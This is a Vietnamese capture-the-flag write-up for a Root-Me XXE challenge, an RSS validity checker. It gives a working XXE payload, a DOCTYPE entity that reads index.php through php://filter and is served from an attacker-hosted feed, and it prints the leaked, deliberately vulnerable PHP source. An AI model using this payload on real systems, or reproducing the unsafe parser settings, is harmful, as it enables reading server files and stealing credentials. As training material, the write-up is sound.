<main class="main" role="main">
    <div class="content">
        <article id="post-xxe/xxe_chall1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    XML External Entities
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/XML-External-Entity" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/XML-External-Entity</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>RSS Validity Checker</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Retrieve the administrator password.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h2 id="RSS-Sao-nghe-la-vay"><a href="#RSS-Sao-nghe-la-vay" class="headerlink" title="RSS? Sao nghe lạ vậy."></a>RSS? Sao nghe lạ vậy.</h2>
                <p>Thật ra RSS cũng là một dạng dữ liệu cấu trúc xml thôi.<br>Ta search google xem nào.</p>
                <ul>
                    <li><strong>Wiki</strong>: <a href="https://vi.wikipedia.org/wiki/RSS_(%C4%91%E1%BB%8Bnh_d%E1%BA%A1ng_t%E1%BA%ADp_tin)" target="_blank" rel="noopener">https://vi.wikipedia.org/wiki/RSS_(%C4%91%E1%BB%8Bnh_d%E1%BA%A1ng_t%E1%BA%ADp_tin)</a></li>
                </ul>
                <p>Nó thường ở các website cung cấp tin tức, thay đổi thường xuyên. Người dùng sẽ nhận về dữ liệu kiểu RSS và xử lý.</p>
                <p>Định dạng cơ bản của RSS:<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>W3Schools Home Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span>&gt;</span>https://www.w3schools.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Free web building tutorials<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>RSS Tutorial<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>https://www.w3schools.com/xml/xml_rss.asp<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>New RSS tutorial on W3Schools<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XML Tutorial<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>https://www.w3schools.com/xml<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>New XML tutorial on W3Schools<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Ta sử dụng XXE cho nó thôi. Thêm đoạn xml entities dtd sau:<br></p>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;!DOCTYPE rss [</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</span></span><br><span class="line"><span class="meta">] &gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Nhớ lấy nó ra ở phần xml content nhé.</p>
                <h2 id="Hoan-thanh-payload"><a href="#Hoan-thanh-payload" class="headerlink" title="Hoàn thành payload"></a>Hoàn thành payload</h2>
                <figure class="highlight xml">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE rss [</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</span></span><br><span class="line"><span class="meta">] &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span>&gt;</span>https://www.w3schools.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Free web building tutorials<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>RSS Tutorial<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>https://www.w3schools.com/xml/xml_rss.asp<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>New RSS tutorial on W3Schools<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Nó chỉ cho đặt URL, nên bạn upload con xml XXE này lên server riêng rồi cung cấp URL nhé.</p>
                <h2 id="Ket-qua"><a href="#Ket-qua" class="headerlink" title="Kết quả:"></a>Kết quả:</h2>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ) $_GET[<span class="string">'action'</span>]=<span class="string">"checker"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'action'</span>] == <span class="string">"checker"</span>){</span><br><span class="line"></span><br><span class="line">        libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">        libxml_use_internal_errors(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;h2&gt;RSS Validity Checker&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form method="post" action="index.php"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="text" name="url" value="http://host.tld/rss" /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="submit" /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"url"</span>]) &amp;&amp; !(<span class="keyword">empty</span>($_POST[<span class="string">"url"</span>]))) {</span><br><span class="line">                $url = $_POST[<span class="string">"url"</span>];</span><br><span class="line">                $url = <span class="string">"$url"</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;URL : "</span>.htmlentities($url).<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    $ch = curl_init(<span class="string">"$url"</span>);</span><br><span class="line">                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">                    curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">3</span>);</span><br><span class="line">                    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,<span class="number">0</span>); </span><br><span class="line">                    $inject = curl_exec( $ch );</span><br><span class="line">                    curl_close($ch);</span><br><span class="line">                    $string = simplexml_load_string($inject, <span class="keyword">null</span>, LIBXML_NOENT);</span><br><span class="line">                    <span class="keyword">if</span> ( ! is_object($string)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"error"</span>); </span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">foreach</span>($string-&gt;channel-&gt;item <span class="keyword">as</span> $row){</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"==================================================="</span>;</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">                        <span class="keyword">print</span> $row-&gt;title;</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"==================================================="</span>;</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"&lt;h4 style='color: green;'&gt;XML document is valid&lt;/h4&gt;"</span>;</span><br><span class="line">                    }</span><br><span class="line">                } <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) {</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"&lt;h4 style='color: red;'&gt;XML document is not valid&lt;/h4&gt;"</span>;</span><br><span class="line">                }                   </span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'action'</span>] == <span class="string">"auth"</span>){</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;strong&gt;Login&lt;/strong&gt;&lt;br /&gt;&lt;form METHOD="POST"&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" name="username" /&gt;</span></span><br><span class="line"><span class="string">&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;input type="password" name="password" /&gt;</span></span><br><span class="line"><span class="string">&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;input type="submit" /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]))</span><br><span class="line">        {</span><br><span class="line">                $user=$_POST[<span class="string">"username"</span>];</span><br><span class="line">                $pass=$_POST[<span class="string">"password"</span>];</span><br><span class="line">                <span class="keyword">if</span>($user === <span class="string">"admin"</span> &amp;&amp; $pass === <span class="string">"****"</span>){</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"Flag : ***&lt;br /&gt;"</span>;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/body&gt;&lt;/html&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Khá giống những gì ta đã học phải ko nào?</p>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>